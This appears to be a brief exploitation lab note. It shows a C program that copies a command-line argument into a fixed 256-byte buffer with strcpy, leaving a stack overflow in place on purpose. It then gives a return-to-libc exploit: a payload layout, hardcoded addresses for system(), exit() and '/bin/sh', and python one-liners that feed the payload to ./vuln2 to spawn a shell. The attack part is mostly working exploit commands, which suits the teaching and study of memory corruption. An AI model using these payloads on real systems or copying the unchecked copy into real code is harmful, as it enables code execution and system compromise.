#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {

  char buf[256];

  strcpy(buf, argv[1]);
  printf("Input: %s\n", buf);

  return 0;
}

JUNK * 260 + address to system() + address to exit() + address to /bin/sh
				0xb7ec2990			0xb7eb7fb0			0xbffffcd8 
				0xbffffcd9			0xbffffcdb
"A"*260+“\x90\x29\xec\xb7” + “\xb0\x7f\xeb\xb7” + “\xd8\xfc\xff\xbf”

./vuln2 `python -c 'print "A"*260+"\x90\x29\xec\xb7" + "\xb0\x7f\xeb\xb7" + "\xd8\xfc\xff\xbf"'`

./vuln2 `python -c 'print "A"*260+"\xd9\xfc\xff\xbf" + "\xdb\xfc\xff\xbf" + "\xd8\xfc\xff\xbf"'`
